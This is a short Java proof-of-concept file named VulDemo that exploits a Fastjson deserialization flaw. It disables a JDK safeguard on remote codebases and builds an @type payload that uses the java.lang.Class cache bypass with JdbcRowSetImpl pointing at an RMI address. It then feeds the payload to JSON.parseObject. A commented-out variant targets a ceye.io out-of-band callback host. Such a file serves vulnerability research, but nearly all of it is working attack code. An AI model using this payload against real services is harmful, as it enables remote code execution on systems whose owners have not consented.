package com.venscor;

import com.alibaba.fastjson.JSON;

/**
 * @ClassName VulDemo
 * @Description TODO
 * @Author venscor
 * @Create Time 2019-07-11 20:49
 * @Version 1.0
 */
public class VulDemo {
    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true"); // 高版本jdk对jdni注入有限制，jdk8u122及以上
//        String payload = PoC.jdbcRowSetImplPayload45();
        String payload = "{\"fuck\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"fuck\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost/RemoteBean\",\"autoCommit\":true}}\n";
//        String payload = "{\"kkk\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"fuck\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://7778888.9y4m0k.ceye.io//RemoteBean\",\"autoCommit\":true}}\n";
        System.out.println(payload);
//        String[] payloads = PoC.bcelPayload("hacked！！");
        JSON.parseObject(payload);
    }

}
